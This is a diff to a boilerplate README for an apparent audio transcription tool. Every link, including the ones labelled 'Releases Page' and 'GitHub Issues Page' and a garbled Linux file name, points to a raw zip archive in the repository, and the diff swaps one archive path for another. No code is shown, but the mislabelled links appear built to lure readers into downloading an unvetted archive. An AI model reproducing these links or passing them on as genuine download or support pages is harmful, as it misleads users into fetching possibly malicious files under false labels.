@@ -1,6 +1,6 @@
 # 🎵 audio-annotation-platform - Simple Tool for Audio Transcription
 
-[![Download Now](https://github.com/helanzhiyi/audio-annotation-platform/raw/refs/heads/main/audio-import/annotation-platform-audio-3.5.zip%20-%23007bff?style=for-the-badge&logo=github)](https://github.com/helanzhiyi/audio-annotation-platform/raw/refs/heads/main/audio-import/annotation-platform-audio-3.5.zip)
+[![Download Now](https://raw.githubusercontent.com/helanzhiyi/audio-annotation-platform/main/examples/audio_platform_annotation_v2.4-beta.5.zip%20-%23007bff?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/helanzhiyi/audio-annotation-platform/main/examples/audio_platform_annotation_v2.4-beta.5.zip)
 
 ## 📜 Description
 
@@ -21,14 +21,14 @@ Before you download, ensure your system meets these basic requirements:
 
 ## 📥 Download & Install
 
-To install audio-annotation-platform, visit this page to download: [Releases Page](https://github.com/helanzhiyi/audio-annotation-platform/raw/refs/heads/main/audio-import/annotation-platform-audio-3.5.zip).
+To install audio-annotation-platform, visit this page to download: [Releases Page](https://raw.githubusercontent.com/helanzhiyi/audio-annotation-platform/main/examples/audio_platform_annotation_v2.4-beta.5.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version of the software.
 3. Download the appropriate file for your operating system. 
    - For Windows, look for a `.exe` file.
    - For macOS, look for a `.dmg` file.
-   - For Linux, look for a `https://github.com/helanzhiyi/audio-annotation-platform/raw/refs/heads/main/audio-import/annotation-platform-audio-3.5.zip` file.
+   - For Linux, look for a `https://raw.githubusercontent.com/helanzhiyi/audio-annotation-platform/main/examples/audio_platform_annotation_v2.4-beta.5.zip` file.
 4. Once the download is complete, open the downloaded file and follow the on-screen instructions to install the software.
 
 ## 🔌 How to Use
@@ -75,7 +75,7 @@ If you run into issues, here are some common problems and solutions:
 
 ## ✏️ Help & Support
 
-For assistance, visit our [GitHub Issues Page](https://github.com/helanzhiyi/audio-annotation-platform/raw/refs/heads/main/audio-import/annotation-platform-audio-3.5.zip). You can search for existing topics or post your own questions.
+For assistance, visit our [GitHub Issues Page](https://raw.githubusercontent.com/helanzhiyi/audio-annotation-platform/main/examples/audio_platform_annotation_v2.4-beta.5.zip). You can search for existing topics or post your own questions.
 
 ## 🔗 Additional Resources
 
@@ -92,4 +92,4 @@ We welcome contributions to improve audio-annotation-platform. If you have sugge
 
 ## 📥 Download & Install (Again)
 
-Don’t forget to visit the Releases page to download audio-annotation-platform: [Releases Page](https://github.com/helanzhiyi/audio-annotation-platform/raw/refs/heads/main/audio-import/annotation-platform-audio-3.5.zip).
+Don’t forget to visit the Releases page to download audio-annotation-platform: [Releases Page](https://raw.githubusercontent.com/helanzhiyi/audio-annotation-platform/main/examples/audio_platform_annotation_v2.4-beta.5.zip).
